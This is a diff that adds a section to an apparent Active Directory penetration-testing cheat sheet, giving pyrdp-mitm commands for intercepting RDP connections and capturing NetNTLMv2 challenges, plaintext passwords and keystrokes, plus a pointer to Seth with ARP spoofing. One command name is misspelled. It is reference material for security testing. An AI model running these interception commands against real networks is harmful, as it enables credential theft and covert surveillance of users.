@@ -2219,6 +2219,21 @@ secretsdump.py -k -no-pass target.lab.local
     # IP of PC1: 10.0.0.4
     ```
 
+#### Man-in-the-middle RDP connections with pyrdp-mitm
+* https://github.com/GoSecure/pyrdp
+* https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/
+* Usage
+```sh
+pyrdp-mitm.py <IP>
+pyrdp-mitp.py <IP>:<PORT> # with custom port
+pyrdp-mitm.py <IP> -k private_key.pem -c certificate.pem # with custom key and certificate
+```
+* Exploitation
+  * If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge
+  * If NLA is disabled, you will obtain the password in plaintext
+  * Other features are available such as keystroke recording
+* Alternatives
+  * S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener	
 
 ### Active Directory Certificate Services
 
